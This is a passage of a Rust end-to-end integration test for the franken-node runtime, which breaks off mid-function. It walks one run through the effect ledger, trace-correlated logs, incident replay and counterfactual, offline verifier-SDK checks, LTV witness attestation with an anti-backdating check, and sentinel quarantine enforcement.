//! bd-f5b04.8.1 — MASTER MOCK-FREE TNR PIPELINE E2E (single trace-id).
//!
//! Walks ONE real operation through every trust-native-runtime layer that is
//! wired into the product today, asserting at each hop that the layers
//! actually compose — no mocks, no stubs, no synthetic verdicts:
//!
//!   L1 RUN      `franken-node run` (subprocess, in-process native engine)
//!               executes a real app doing fs.writeFileSync + fs.readFileSync
//!               + http.get; real bytes hit disk, a real loopback socket
//!               observes the egress, the exit code derives from the real
//!               containment verdict.
//!   L2 EFFECT   Every host crossing lands in the signed host-effect ledger
//!               (`dispatch.host_effect_ledger` in `run --json`): tamper-
//!               evident hash chain, allowed/denied accounting, sha256 head.
//!   L3 LOG      One `--trace-id` correlates the ordered structured-log
//!               event stream (RUN-001 → RUN-003 → FN-EFFECT-002 per host
//!               crossing → RUN-004 on stderr JSONL).
//!   L4 REPLAY   The run's receipts become incident evidence; `incident
//!               bundle --verify` → `incident replay` (matched, thrice-stable
//!               upstream) → `incident counterfactual --policy strict` all
//!               succeed through the real CLI against the same state root.
//!   L5 VSDK     The public verifier SDK re-derives the effect chain OFFLINE
//!               from the ledger entries alone (zero trust in this runtime).
//!   L6 LTV      `franken-node ltv attest` (bd-rgkd2) binds the run's receipt
//!               chain hashes + the sealed bundle into self-contained SDK LTV
//!               evidence (real 2-of-3 Ed25519 witness cosign over a
//!               re-attested root), the product evidence ledger accepts the
//!               cosigned witness receipt, and `ltv verify-as-of` re-derives
//!               the whole claim OFFLINE through the verifier SDK — both CLI
//!               legs run as real subprocesses under the pipeline trace id,
//!               with a fail-closed anti-backdating arm.
//!
//! HONEST SCOPE (verified against source 2026-07-11, bd-f5b04.8.1): the
//! following bead-vision layers are NOT yet reachable from a live `run` and
//! are therefore NOT asserted here — each has a follow-up bead instead of a
//! mock:
//!   * Information-flow labeling IS now wired on the run path (bd-plhag): a
//!     read of a recognized secret file labels its bytes, an egress that
//!     carries those bytes inherits the label, and a denied such egress is a
//!     flow BLOCK the verifier SDK proves as "blocked_before_sink" (asserted
//!     in the exfil variant below). Still open: byte-level PREVENTION of a
//!     secret egress to an SSRF-ALLOWED endpoint (the ledger records+the SDK
//!     detects it, but the runtime does not yet block it — a gate-level
//!     follow-up), following a secret through in-guest transforms (needs
//!     engine-side per-datum lineage), and operator declassification input.
//!   * Bayesian sentinel escalation IS now fed on the run path (bd-bg2hy)
//!     AND drives product-side enforcement (bd-fp1je): the dispatcher derives
//!     canonical observations from the signed ledger (FN-SENTINEL-001),
//!     updates the fixed-point e-process per effect (FN-SENTINEL-002),
//!     selects an expected-loss action (FN-SENTINEL-007), signs an escalation
//!     receipt (FN-SENTINEL-008), and — under a profile whose
//!     `trust.quarantine_on_high_risk` is enabled — writes a durable
//!     content-hash-keyed run-subject quarantine record, risk-bumps the run's
//!     Trusted dependency trust cards, and emits FN-SENTINEL-009; a rerun of
//!     that subject then fails CLOSED at the trust preflight until an audited
//!     `trust release` (L7 below). Still open: fleet-scope action (the run
//!     path is single-node and lacks zone/incident context).
//!   * FN-EFFECT-002 is emitted per ledger entry on the run path (bd-ihtox)
//!     and FN-TTR-001/002 on the incident replay path (bd-x8d9t) — both
//!     pinned by the ordered-event assertions under the pipeline trace id.
//!     FN-EFFECT-001 (receipt STARTED — needs an in-flight emission site
//!     inside the dispatcher) and FN-CAS-* remain registered in
//!     docs/observability/tnr_event_metrics_registry.md but unemitted.
//!
//! Run this lane directly with: `scripts/run_tnr_full_pipeline.sh`

#![cfg(feature = "engine")]

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::Path;
use std::process::{Command, Output};
use std::time::Duration;

use frankenengine_node::control_plane::mmr_proofs::{
    MmrRootWitnessReceipt, MmrRootWitnessTrustAnchor,
};
use frankenengine_node::observability::evidence_ledger::{EvidenceLedger, LedgerCapacity};
use frankenengine_node::tools::replay_bundle::{
    EventType, INCIDENT_EVIDENCE_SCHEMA, IncidentEvidenceEvent, IncidentEvidenceMetadata,
    IncidentEvidencePackage, IncidentSeverity,
};
use serde_json::{Value, json};

/// The single trace id that correlates every layer of one pipeline walk.
const CLEAN_TRACE_ID: &str = "tnr-full-pipeline-e2e-clean-7c41";
const EXFIL_TRACE_ID: &str = "tnr-full-pipeline-e2e-exfil-9d02";

/// Path to the binary under test (set by Cargo for integration tests).
fn franken_node_bin() -> &'static str {
    env!("CARGO_BIN_EXE_franken-node")
}

fn layer_pass(layer: &str, detail: &str) {
    println!("[TNR-E2E] {layer:<44} PASS  {detail}");
}

fn run_cli(workspace: &Path, args: &[&str]) -> Output {
    Command::new(franken_node_bin())
        .current_dir(workspace)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `{}`: {err}", args.join(" ")))
}

/// Bootstrap a real operator workspace: `franken-node init` (which
/// synthesizes the fail-closed security defaults), then extend the generated
/// config with the decision-receipt signing key (so `incident bundle` signs
/// bundles) and a loopback allowlist entry (so the guest's http egress to the
/// test sink passes the SSRF gate exactly the way an operator would permit an
/// internal endpoint).
fn bootstrap_workspace(app_src: &str, profile: &str) -> tempfile::TempDir {
    let dir = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(dir.path().join("app.js"), app_src).expect("write fixture app");

    let init = run_cli(
        dir.path(),
        &["init", "--profile", profile, "--out-dir", "."],
    );
    assert!(
        init.status.success(),
        "init must bootstrap the workspace; exit={:?} stderr=\n{}",
        init.status.code(),
        String::from_utf8_lossy(&init.stderr)
    );

    let config_path = dir.path().join("franken_node.toml");
    let mut config = std::fs::read_to_string(&config_path).expect("read init config");
    // Inject the receipt-signing key into the existing [security] section if
    // init generated one; otherwise add the section. Appending a duplicate
    // `[security]` header would be a TOML parse error, hence the split.
    let signing_line = "decision_receipt_signing_key_path = \"keys/receipt-signing.key\"\n";
    if let Some(pos) = config.find("[security]\n") {
        let insert_at = pos + "[security]\n".len();
        config.insert_str(insert_at, signing_line);
    } else {
        config.push_str("\n[security]\n");
        config.push_str(signing_line);
    }
    // init emits an inline `allowlist = []` under [security.network_policy];
    // appending an array-of-tables would redefine the key (TOML error), so
    // replace the inline empty array with the loopback exception in place.
    assert!(
        config.contains("allowlist = []"),
        "init-generated config no longer carries an empty allowlist; \
         update the tnr_full_pipeline_e2e config patch: {config}"
    );
    config = config.replace(
        "allowlist = []",
        "allowlist = [{ host = \"127.0.0.1\", reason = \"tnr full-pipeline e2e: permit the loopback test sink\" }]",
    );
    // bd-fp1je: the legacy-risky profile default is recommend-only (strict/
    // balanced already enforce); force enforcement writes on so the pipeline
    // can assert the sentinel auto-quarantine loop end-to-end regardless of
    // profile.
    assert!(
        config.contains("quarantine_on_high_risk = "),
        "init-generated config no longer serializes trust.quarantine_on_high_risk; \
         update the tnr_full_pipeline_e2e config patch: {config}"
    );
    // legacy-risky serializes `= false`; strict/balanced already `= true`.
    config = config.replace(
        "quarantine_on_high_risk = false",
        "quarantine_on_high_risk = true",
    );
    std::fs::write(&config_path, config).expect("write patched config");

    write_receipt_signing_key(&dir.path().join("keys/receipt-signing.key"));
    dir
}

/// Deterministic test signing key (same convention as incident_cli_e2e):
/// hex-encoded ed25519 seed on disk, matching trust anchor derived below.
fn write_receipt_signing_key(path: &Path) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create key dir");
    }
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x42_u8; 32]);
    std::fs::write(path, hex::encode(signing_key.to_bytes())).expect("write signing key");
}

fn write_replay_trust_anchor(path: &Path) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create key dir");
    }
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x42_u8; 32]);
    std::fs::write(path, hex::encode(signing_key.verifying_key().to_bytes()))
        .expect("write replay trust anchor");
}

struct RunReport {
    exit_code: Option<i32>,
    report: Value,
    stderr: String,
}

/// Drive `franken-node run` as a real subprocess with the pipeline's trace id.
///
/// The pipeline tests run under `legacy-risky` because that is the profile
/// that GRANTS `fs:*` and `net:*` at the engine capability layer, which lets
/// the walk exercise the product-layer SSRF gate as the enforcement boundary
/// (allowed loopback vs denied metadata endpoint) with the ledger as the
/// evidence channel. Under `balanced` the engine capability gate itself
/// refuses `fs:write` with a hard interpreter abort — a DIFFERENT, earlier
/// enforcement arm, pinned separately by
/// `tnr_engine_capability_gate_fails_closed_under_balanced`.
fn run_app(workspace: &Path, trace_id: &str, policy: &str) -> RunReport {
    let output = Command::new(franken_node_bin())
        .current_dir(workspace)
        .args([
            "run",
            "app.js",
            "--policy",
            policy,
            "--runtime",
            "franken-engine",
            // With the `engine` feature the native path runs in-process and
            // the engine binary is a presence gate only (never spawned);
            // pointing it at the binary under test is the established
            // convention (see run_console_exit_e2e.rs).
            "--engine-bin",
            franken_node_bin(),
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ])
        .output()
        .expect("spawn franken-node run");

    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
    let report: Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("run --json stdout must be pure JSON ({err}); stdout:\n{stdout}\nstderr:\n{stderr}")
    });
    RunReport {
        exit_code: output.status.code(),
        report,
        stderr,
    }
}

/// Parse the structured-log JSONL stream from stderr into (event_code,
/// trace_id) pairs, in emission order.
fn structured_events(stderr: &str) -> Vec<(String, String)> {
    stderr
        .lines()
        .filter_map(|line| serde_json::from_str::<Value>(line).ok())
        .filter_map(|value| {
            let code = value.get("event_code")?.as_str()?.to_string();
            let trace = value
                .get("trace_id")
                .and_then(Value::as_str)
                .unwrap_or_default()
                .to_string();
            Some((code, trace))
        })
        .collect()
}

/// Assert `expected` appears as an ordered subsequence of the event stream.
fn assert_event_order(events: &[(String, String)], expected: &[&str], trace_id: &str) {
    let mut cursor = 0;
    for (code, trace) in events {
        assert_eq!(
            trace, trace_id,
            "every structured-log event must carry the pipeline trace id; \
             event {code} carried {trace:?}"
        );
        if cursor < expected.len() && code == expected[cursor] {
            cursor += 1;
        }
    }
    assert_eq!(
        cursor,
        expected.len(),
        "expected ordered event-code subsequence {expected:?}, observed {:?}",
        events
            .iter()
            .map(|(code, _)| code.as_str())
            .collect::<Vec<_>>()
    );
}

/// Synthesize the incident evidence package FROM the real run outputs: one
/// evidence event per signed effect receipt, chained parent→child in ledger
/// order, with the full receipt JSON as the event payload. This is evidence
/// ASSEMBLY (the operator's collection step), not mocking — every payload
/// byte originated in the live run above.
fn write_incident_evidence_from_ledger(
    path: &Path,
    incident_id: &str,
    trace_id: &str,
    ledger: &Value,
) -> usize {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create evidence dir");
    }
    let entries = ledger["entries"].as_array().expect("ledger entries array");
    assert!(
        !entries.is_empty(),
        "ledger must carry at least one receipt"
    );

    let mut events = Vec::with_capacity(entries.len());
    let mut refs = Vec::with_capacity(entries.len());
    for (idx, entry) in entries.iter().enumerate() {
        let event_id = format!("evt-{:03}", idx + 1);
        let reference = format!("refs/effects/{event_id}.json");
        events.push(IncidentEvidenceEvent {
            event_id: event_id.clone(),
            timestamp: format!("2026-07-11T10:00:{:02}.000000Z", idx.min(59)),
            event_type: EventType::PolicyEval,
            payload: json!({
                "effect_receipt_chain_entry": entry,
                "chain_hash": entry["chain_hash"],
            }),
            provenance_ref: reference.clone(),
            parent_event_id: idx.checked_sub(1).map(|p| format!("evt-{:03}", p + 1)),
            state_snapshot: None,
            policy_version: None,
        });
        refs.push(reference);
    }

    let package = IncidentEvidencePackage {
        schema_version: INCIDENT_EVIDENCE_SCHEMA.to_string(),
        incident_id: incident_id.to_string(),
        collected_at: "2026-07-11T10:05:00.000000Z".to_string(),
        trace_id: trace_id.to_string(),
        severity: IncidentSeverity::High,
        incident_type: "security".to_string(),
        detector: "tnr-full-pipeline-e2e".to_string(),
        policy_version: "legacy-risky".to_string(),
        initial_state_snapshot: json!({
            "chain_head_hash": ledger["chain_head_hash"],
            "effect_count": ledger["effect_count"],
            "allowed_count": ledger["allowed_count"],
            "denied_count": ledger["denied_count"],
        }),
        events,
        evidence_refs: refs,
        metadata: IncidentEvidenceMetadata {
            title: "TNR full-pipeline e2e evidence assembled from live run receipts".to_string(),
            affected_components: vec!["host-effect-bridge".to_string()],
            tags: vec!["tnr".to_string(), "e2e".to_string()],
        },
    };
    std::fs::write(
        path,
        serde_json::to_string_pretty(&package).expect("serialize evidence package"),
    )
    .expect("write evidence package");
    entries.len()
}

fn parse_replay_result(stderr: &str) -> (bool, usize) {
    let line = stderr
        .lines()
        .find(|line| line.starts_with("incident replay result:"))
        .unwrap_or_else(|| panic!("missing replay result line in stderr:\n{stderr}"));
    let mut matched = None;
    let mut event_count = None;
    for token in line.split_whitespace() {
        if let Some(value) = token.strip_prefix("matched=") {
            matched = Some(value == "true");
        }
        if let Some(value) = token.strip_prefix("event_count=") {
            event_count = Some(value.parse::<usize>().expect("event_count"));
        }
    }
    (
        matched.expect("matched field"),
        event_count.expect("event_count field"),
    )
}

/// Where the incident chain's evidence comes from.
enum IncidentEvidence<'a> {
    /// `run` captured it itself when the run tripped a runtime control
    /// (bd-reality-20260923-26n9r.8): the product default location, no
    /// `--evidence-path`, real per-effect timestamps.
    CapturedByRun,
    /// A clean run trips no control and so has no incident; the chain is
    /// exercised over evidence this harness assembles from the run's ledger.
    AssembledFromLedger(&'a Value),
}

/// The id `run` gives an automatically captured incident: `INC-RUN-` plus the
/// first 16 hex digits of the host-effect chain head.
fn captured_incident_id(ledger: &Value) -> String {
    let head = ledger["chain_head_hash"]
        .as_str()
        .expect("chain_head_hash")
        .trim_start_matches("sha256:");
    format!("INC-RUN-{}", &head[..16])
}

/// Drive the incident CLI chain (bundle --verify → replay → counterfactual
/// --policy strict) over the incident's evidence, returning the bundle's
/// integrity hash for the LTV leg.
fn incident_chain_leg(
    workspace: &Path,
    incident_id: &str,
    trace_id: &str,
    evidence: IncidentEvidence<'_>,
) -> String {
    let mut bundle_args = vec![
        "incident".to_string(),
        "bundle".to_string(),
        "--id".to_string(),
        incident_id.to_string(),
    ];
    let event_count = match evidence {
        IncidentEvidence::CapturedByRun => {
            let captured = workspace
                .join(".franken-node/state/incidents")
                .join(incident_id)
                .join("evidence.v1.json");
            let package: Value =
                serde_json::from_slice(&std::fs::read(&captured).unwrap_or_else(|err| {
                    panic!("run must have captured {}: {err}", captured.display())
                }))
                .expect("captured evidence is JSON");
            assert_eq!(package["detector"], "franken-node run (automatic capture)");
            assert_eq!(package["trace_id"], trace_id);
            package["events"].as_array().expect("events").len()
        }
        IncidentEvidence::AssembledFromLedger(ledger) => {
            let evidence_path = workspace
                .join("fixtures/incidents")
                .join(incident_id)
                .join("evidence.v1.json");
            let count =
                write_incident_evidence_from_ledger(&evidence_path, incident_id, trace_id, ledger);
            bundle_args.push("--evidence-path".to_string());
            bundle_args.push(evidence_path.to_string_lossy().to_string());
            count
        }
    };
    bundle_args.push("--verify".to_string());
    let bundle_arg_refs = bundle_args.iter().map(String::as_str).collect::<Vec<_>>();

    let bundle_output = run_cli(workspace, &bundle_arg_refs);
    assert!(
        bundle_output.status.success(),
        "incident bundle failed: {}",
        String::from_utf8_lossy(&bundle_output.stderr)
    );
    let bundle_stderr = String::from_utf8_lossy(&bundle_output.stderr);
    assert!(
        bundle_stderr.contains("bundle integrity: valid"),
        "bundle must self-verify: {bundle_stderr}"
    );
    layer_pass(
        "L4 REPLAY incident bundle --verify",
        &format!("{event_count} receipt-events sealed into {incident_id}.fnbundle"),
    );

    let trust_anchor_path = workspace.join("keys/replay-trust-anchor.pub");
    write_replay_trust_anchor(&trust_anchor_path);
    let trust_anchor_arg = trust_anchor_path.to_string_lossy().to_string();
    let bundle_file = format!("{incident_id}.fnbundle");

    let replay_output = run_cli(
        workspace,
        &[
            "incident",
            "replay",
            "--bundle",
            &bundle_file,
            "--trusted-public-key",
            &trust_anchor_arg,
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        replay_output.status.success(),
        "incident replay failed: {}",
        String::from_utf8_lossy(&replay_output.stderr)
    );
    let replay_stderr = String::from_utf8_lossy(&replay_output.stderr).into_owned();
    let (matched, replayed_events) = parse_replay_result(&replay_stderr);
    assert!(matched, "replay must re-derive the recorded sequence");
    assert_eq!(
        replayed_events, event_count,
        "replay must cover every receipt-event"
    );
    // bd-x8d9t: the replay lifecycle surfaces as registered FN-TTR events
    // under the SAME trace id as the run that produced the receipts —
    // cross-command trace continuity for the whole pipeline.
    let replay_events = structured_events(&replay_stderr);
    assert_event_order(&replay_events, &["FN-TTR-001", "FN-TTR-002"], trace_id);
    layer_pass(
        "L4 REPLAY incident replay",
        &format!("matched=true event_count={replayed_events} FN-TTR-001→002 on trace"),
    );

    let counterfactual_output = run_cli(
        workspace,
        &[
            "incident",
            "counterfactual",
            "--bundle",
            &bundle_file,
            "--trusted-public-key",
            &trust_anchor_arg,
            "--policy",
            "strict",
            "--json",
        ],
    );
    assert!(
        counterfactual_output.status.success(),
        "incident counterfactual failed: {}",
        String::from_utf8_lossy(&counterfactual_output.stderr)
    );
    let counterfactual_stdout = String::from_utf8_lossy(&counterfactual_output.stdout);
    let counterfactual: Value =
        serde_json::from_str(counterfactual_stdout.trim()).unwrap_or_else(|err| {
            panic!("counterfactual --json must emit JSON ({err}):\n{counterfactual_stdout}")
        });
    assert_eq!(
        counterfactual["schema_version"],
        json!("franken-node/incident-counterfactual-report/v2"),
        "counterfactual report schema pin"
    );
    let total_decisions = counterfactual["total_decisions"]
        .as_u64()
        .expect("total_decisions");
    assert_eq!(
        total_decisions as usize, event_count,
        "counterfactual must re-evaluate every recorded decision"
    );
    layer_pass(
        "L4 REPLAY incident counterfactual --policy strict",
        &format!(
            "total_decisions={total_decisions} changed_decisions={} severity_delta={}",
            counterfactual["changed_decisions"], counterfactual["severity_delta"]
        ),
    );

    // Extract the sealed bundle's integrity hash so the LTV leg can bind the
    // replay artifact into the long-term log alongside the effect chain.
    let bundle_json: Value = serde_json::from_str(
        &std::fs::read_to_string(workspace.join(&bundle_file)).expect("read bundle"),
    )
    .expect("bundle is canonical JSON");
    bundle_json["integrity_hash"]
        .as_str()
        .expect("bundle integrity_hash")
        .to_string()
}

/// Offline verifier-SDK leg: re-derive the effect chain from the `run --json`
/// ledger entries alone — the exact surface an external auditor consumes.
fn verifier_sdk_leg(ledger: &Value) -> String {
    let entries_json = serde_json::to_string(&ledger["entries"]).expect("serialize entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the effect chain offline");
    let ledger_head = ledger["chain_head_hash"].as_str().expect("chain head");
    assert_eq!(
        verdict.head_chain_hash, ledger_head,
        "offline re-derived head must match the runtime's chain head"
    );
    assert_eq!(
        verdict.effect_count as u64,
        ledger["effect_count"].as_u64().unwrap()
    );
    layer_pass(
        "L5 VSDK offline effect-chain re-derivation",
        &format!("head={}…", &ledger_head[..24.min(ledger_head.len())]),
    );
    ledger_head.to_string()
}

fn witness_signing_key(index: u8) -> ed25519_dalek::SigningKey {
    // Deterministic distinct seeds for the 3 independent witnesses.
    ed25519_dalek::SigningKey::from_bytes(&[0x51 + index; 32])
}

/// CLI LTV leg (bd-rgkd2): `ltv attest` binds the run's signed effect chain
/// hashes + the sealed bundle into self-contained SDK LTV evidence, cosigned
/// by a real 2-of-3 Ed25519 witness threshold over a re-attested root; the
/// product evidence ledger accepts the cosigned witness receipt off the CLI
/// wire shape; `ltv verify-as-of` re-derives the whole claim OFFLINE through
/// the verifier SDK; a backdated as-of fails closed with FN-LTV-ERR-001.
fn ltv_leg(
    workspace: &Path,
    run_report: &Value,
    bundle_file: &str,
    bundle_integrity_hash: &str,
    trace_id: &str,
) {
    use sha2::{Digest, Sha256};

    std::fs::write(
        workspace.join("run-report.json"),
        serde_json::to_string(run_report).expect("serialize run report"),
    )
    .expect("persist run report for ltv attest");
    for index in 0..3_u8 {
        let key_path = workspace.join(format!("keys/ltv-witness-{index}.key"));
        std::fs::create_dir_all(key_path.parent().expect("key parent")).expect("key dir");
        std::fs::write(
            &key_path,
            hex::encode(witness_signing_key(index).to_bytes()),
        )
        .expect("write witness key");
    }

    // Select trust before generating the evidence. Neither witness keys nor
    // suite validity/compromise records are recovered from the candidate.
    let approved_anchor = json!({
        "witness_group_id": "tnr-e2e-witnesses",
        "witness_policy_id": "ltv-policy-v1",
        "threshold_config": {
            "threshold": 2,
            "total_signers": 3,
            "signer_keys": (0..3_u8).map(|index| json!({
                "key_id": format!("ltv-witness-{index}"),
                "public_key_hex": hex::encode(witness_signing_key(index).verifying_key().to_bytes()),
            })).collect::<Vec<_>>(),
        },
        "suite_records": [{
            "crypto_suite": "ed25519-v1",
            "valid_from_unix_seconds": 1,
            "valid_until_unix_seconds": null,
            "compromised_at_unix_seconds": null,
        }],
    });
    let approved_anchor_bytes =
        serde_json::to_vec_pretty(&approved_anchor).expect("serialize approved witness anchor");
    let approved_policy_sha256 = hex::encode(Sha256::digest(&approved_anchor_bytes));
    std::fs::write(
        workspace.join("witness-anchor.json"),
        &approved_anchor_bytes,
    )
    .expect("write approved witness anchor before attestation");

    let attest_output = run_cli(
        workspace,
        &[
            "ltv",
            "attest",
            "--bundle",
            bundle_file,
            "--trusted-public-key",
            "keys/replay-trust-anchor.pub",
            "--run-report",
            "run-report.json",
            "--witness-key",
            "keys/ltv-witness-0.key",
            "--witness-key",
            "keys/ltv-witness-1.key",
            "--witness-key",
            "keys/ltv-witness-2.key",
            "--witness-anchor",
            "witness-anchor.json",
            "--witness-threshold",
            "2",
            "--witness-group-id",
            "tnr-e2e-witnesses",
            "--witness-policy-id",
            "ltv-policy-v1",
            "--out",
            "ltv-evidence.json",
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        attest_output.status.success(),
        "ltv attest failed: {}",
        String::from_utf8_lossy(&attest_output.stderr)
    );
    let attest_stderr = String::from_utf8_lossy(&attest_output.stderr).into_owned();
    let attest_events = structured_events(&attest_stderr);
    assert_event_order(&attest_events, &["FN-LTV-002", "FN-LTV-001"], trace_id);
    let attest_stdout = String::from_utf8_lossy(&attest_output.stdout);
    let attest: Value = serde_json::from_str(attest_stdout.trim())
        .unwrap_or_else(|err| panic!("ltv attest --json must emit JSON ({err}):\n{attest_stdout}"));
    assert_eq!(
        attest["schema_version"],
        json!("franken-node/ltv-attest-cli/v1")
    );
    assert_eq!(
        attest["artifact_hash"],
        json!(bundle_integrity_hash),
        "the attested artifact must be the sealed bundle"
    );
    let ledger_entry_count = run_report["dispatch"]["host_effect_ledger"]["entries"]
        .as_array()
        .expect("ledger entries")
        .len() as u64;
    assert_eq!(
        attest["origin_tree_size"],
        json!(ledger_entry_count + 1),
        "origin tree must commit the bundle marker plus every effect chain hash"
    );
    assert_eq!(attest["witnesses"], json!(3));
    assert_eq!(attest["witness_threshold"], json!(2));
    assert_eq!(attest["trust_policy_sha256"], approved_policy_sha256);
    layer_pass(
        "L6 LTV attest (CLI, chain+bundle leaves)",
        &format!(
            "origin_tree_size={} witnesses=3/2 FN-LTV-002→001 on trace",
            attest["origin_tree_size"]
        ),
    );

    // The CLI evidence's cosigned witness receipt is wire-compatible with the
    // product evidence ledger's proof-of-anteriority consumer.
    let evidence_bytes =
        std::fs::read(workspace.join("ltv-evidence.json")).expect("read ltv evidence");
    let evidence_json: Value =
        serde_json::from_slice(&evidence_bytes).expect("ltv evidence is canonical JSON");
    assert_eq!(
        serde_json::from_value::<Vec<frankenengine_verifier_sdk::LongTermCryptoSuiteRecord>>(
            evidence_json["suite_records"].clone(),
        )
        .expect("retained suite policy"),
        serde_json::from_value::<Vec<frankenengine_verifier_sdk::LongTermCryptoSuiteRecord>>(
            approved_anchor["suite_records"].clone(),
        )
        .expect("approved suite policy"),
    );
    let receipt: MmrRootWitnessReceipt =
        serde_json::from_value(evidence_json["witness_receipt"].clone())
            .expect("CLI witness receipt must deserialize as the product receipt type");
    let as_of = evidence_json["as_of_unix_seconds"].as_u64().expect("as_of");
    let mut evidence_ledger = EvidenceLedger::new(LedgerCapacity::new(16, 1 << 20));
    // The ledger receives the same independently selected witness authority;
    // its narrower root-witness contract does not certify suite policy.
    let witness_anchor = MmrRootWitnessTrustAnchor::new(
        "tnr-e2e-witnesses",
        "ltv-policy-v1",
        serde_json::from_value(approved_anchor["threshold_config"].clone())
            .expect("approved product witness threshold"),
    )
    .expect("operator witness trust anchor");
    let (_, verification) = evidence_ledger
        .append_mmr_root_witness_receipt(&receipt, &witness_anchor, as_of + 1)
        .expect("witness receipt appends as proof-of-anteriority evidence");
    assert!(verification.valid_signatures >= 2);
    layer_pass(
        "L6 LTV witness receipt → evidence ledger",
        &format!(
            "valid_signatures={}/{} observed_at<=as_of",
            verification.valid_signatures, verification.threshold
        ),
    );

    let verify_output = run_cli(
        workspace,
        &[
            "ltv",
            "verify-as-of",
            "--evidence",
            "ltv-evidence.json",
            "--witness-anchor",
            "witness-anchor.json",
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        verify_output.status.success(),
        "ltv verify-as-of failed: {}",
        String::from_utf8_lossy(&verify_output.stderr)
    );
    let verify_stderr = String::from_utf8_lossy(&verify_output.stderr).into_owned();
    let verify_events = structured_events(&verify_stderr);
    assert_event_order(&verify_events, &["FN-LTV-003"], trace_id);
    let verify_stdout = String::from_utf8_lossy(&verify_output.stdout);
    let verdict: Value = serde_json::from_str(verify_stdout.trim()).unwrap_or_else(|err| {
        panic!("ltv verify-as-of --json must emit JSON ({err}):\n{verify_stdout}")
    });
    assert_eq!(
        verdict["schema_version"],
        json!("franken-node/ltv-verify-as-of-cli/v1")
    );
    assert_eq!(verdict["verdict"], json!("Pass"));
    assert_eq!(verdict["trust_policy_sha256"], approved_policy_sha256);
    assert!(
        verdict["sdk_transcript"]
            .as_array()
            .expect("sdk transcript")
            .iter()
            .any(|event| event["event_code"] == json!("FN_LTV_WITNESS_ANTERIORITY_PROVEN")),
        "offline SDK transcript must prove witness anteriority: {verdict}"
    );
    layer_pass(
        "L6 LTV verify-as-of (offline SDK via CLI)",
        "verdict=Pass anteriority proven FN-LTV-003 on trace",
    );

    // A newly approved compromise policy cannot be erased by retaining the
    // candidate's old, unsigned "not compromised" suite record. The exact
    // threshold signatures still verify, but anteriority must be refused.
    let mut compromised_anchor = approved_anchor.clone();
    compromised_anchor["suite_records"][0]["compromised_at_unix_seconds"] =
        evidence_json["witness_receipt"]["statement"]["observed_at_unix_seconds"].clone();
    std::fs::write(
        workspace.join("compromised-witness-anchor.json"),
        serde_json::to_vec_pretty(&compromised_anchor).expect("serialize compromise policy"),
    )
    .expect("write independently updated compromise policy");
    let compromised_output = run_cli(
        workspace,
        &[
            "ltv",
            "verify-as-of",
            "--evidence",
            "ltv-evidence.json",
            "--witness-anchor",
            "compromised-witness-anchor.json",
            "--json",
        ],
    );
    assert!(
        !compromised_output.status.success(),
        "candidate policy cannot erase a trusted compromise"
    );
    let compromised: Value = serde_json::from_slice(&compromised_output.stdout)
        .expect("compromised policy refusal is JSON");
    assert_eq!(compromised["verdict"], json!("Fail"));
    assert!(
        compromised["checked_assertions"]
            .as_array()
            .unwrap()
            .iter()
            .any(|check| {
                check["assertion"] == "ltv_witness_precedes_key_compromise_records"
                    && check["passed"] == false
            }),
        "trusted compromise must reject the unchanged witness: {compromised}"
    );
    assert_eq!(
        std::fs::read(workspace.join("ltv-evidence.json")).unwrap(),
        evidence_bytes,
        "verification must not rewrite historical evidence to fit a policy",
    );

    // Anti-backdating arm: an as-of before the witness observation must fail
    // closed with the registered error event.
    let backdated_output = run_cli(
        workspace,
        &[
            "ltv",
            "verify-as-of",
            "--evidence",
            "ltv-evidence.json",
            "--witness-anchor",
            "witness-anchor.json",
            "--as-of",
            "1000",
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        !backdated_output.status.success(),
        "backdated as-of must fail closed"
    );
    let backdated_stderr = String::from_utf8_lossy(&backdated_output.stderr);
    assert!(
        backdated_stderr.contains("FN-LTV-ERR-001"),
        "backdated verify must emit FN-LTV-ERR-001: {backdated_stderr}"
    );
    layer_pass(
        "L6 LTV anti-backdating (as-of=1000)",
        "exit!=0 FN-LTV-ERR-001 emitted",
    );
}

/// bd-fp1je enforcement loop: the escalating run wrote a durable sentinel
/// quarantine record and emitted FN-SENTINEL-009; a rerun of the same app
/// fails CLOSED at the trust preflight naming the release command;
/// `trust release` lifts it with an audited operator entry; the subject then
/// runs again and re-quarantines (released records never mask new
/// escalations).
fn sentinel_enforcement_leg(workspace: &Path, run: &RunReport, trace_id: &str) {
    let enforcement = &run.report["receipt"]["sentinel_enforcement"];
    assert_eq!(
        enforcement["mode"],
        json!("enforced"),
        "escalated run must enforce under quarantine_on_high_risk=true: {enforcement}"
    );
    let decision_id = run.report["dispatch"]["sentinel"]["decision"]["decision_id"]
        .as_str()
        .expect("sentinel decision id")
        .to_string();
    assert_eq!(enforcement["decision_id"], json!(&decision_id));
    let record_path_str = enforcement["quarantine_record_path"]
        .as_str()
        .expect("quarantine record path");
    let record_path = {
        let path = Path::new(record_path_str);
        if path.is_absolute() {
            path.to_path_buf()
        } else {
            workspace.join(path)
        }
    };
    let record: Value = serde_json::from_str(
        &std::fs::read_to_string(&record_path).expect("read sentinel quarantine record"),
    )
    .expect("sentinel quarantine record is canonical JSON");
    assert_eq!(
